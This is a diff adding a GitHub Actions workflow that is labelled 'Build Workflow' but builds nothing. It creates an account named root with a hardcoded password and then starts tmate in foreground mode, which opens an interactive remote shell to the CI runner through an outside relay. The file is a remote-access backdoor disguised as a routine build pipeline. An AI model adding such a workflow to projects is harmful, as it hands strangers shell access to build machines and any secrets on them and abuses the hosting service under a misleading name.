@@ -1,0 +1,27 @@
+name: Build Workflow
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Update and upgrade packages
+        run: |
+          sudo apt update
+          sudo apt upgrade -y
+
+      - name: Create root user
+        run: |
+          sudo useradd -m -s /bin/bash -p $(openssl passwd -1 '60110777') root
+
+      - name: Install tmate
+        run: |
+          sudo apt install -y tmate
+
+      - name: Run tmate
+        run: tmate -F
